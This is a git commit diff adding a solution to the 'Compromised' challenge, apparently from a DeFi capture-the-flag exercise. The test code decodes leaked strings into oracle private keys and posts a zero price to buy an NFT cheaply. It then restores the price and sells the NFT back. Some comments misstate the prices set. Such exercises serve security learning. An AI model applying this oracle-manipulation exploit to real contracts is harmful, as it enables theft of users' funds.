9677219be0c89c6698df33882b894578d4c18e21
MIDAV0 <magilnyy.vadimo@gmail.com>
2023-12-17 18:48:47 +0000

    Compromised

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -53,6 +53,47 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        const leakToPrivateKey = (leak) => {
+            const base64 = Buffer.from(leak.split(` `).join(``), `hex`).toString(`utf8`)
+            const hexKey = Buffer.from(base64, `base64`).toString(`utf8`)
+            return hexKey
+        }
+    
+        // Leaked information to format
+        const leakedInformation = [
+            '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35',
+            '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34',
+        ]
+
+        // Check that private keys belong to oracle sources
+        const wallet1 = new ethers.Wallet(leakToPrivateKey(leakedInformation[0]), ethers.provider);
+        const wallet2 = new ethers.Wallet(leakToPrivateKey(leakedInformation[1]), ethers.provider);
+        console.log("Address 1: ", wallet1.address);
+        console.log("Address 2: ", wallet2.address);
+        expect(sources).to.include(wallet1.address);
+        expect(sources).to.include(wallet2.address);
+
+        // Change the price of the NFT to 0.05
+        await oracle.connect(wallet1).postPrice('DVNFT', 0);
+        await oracle.connect(wallet2).postPrice('DVNFT', 0);
+
+        // Check that the price of the NFT is 0.05
+        expect(await oracle.getMedianPrice('DVNFT')).to.eq(0);
+
+        // Buy the NFT
+        await exchange.connect(player).buyOne({ value: 1 });
+
+        // Check that the player owns the NFT
+        expect(await nftToken.ownerOf(0)).to.eq(player.address);
+
+        // Change the price of the NFT to 999
+        await oracle.connect(wallet1).postPrice('DVNFT', INITIAL_NFT_PRICE);
+        await oracle.connect(wallet2).postPrice('DVNFT', INITIAL_NFT_PRICE);
+
+        // Sell the NFT
+        await nftToken.connect(player).approve(exchange.address, 0);
+        await exchange.connect(player).sellOne(0);
     });
 
     after(async function () {
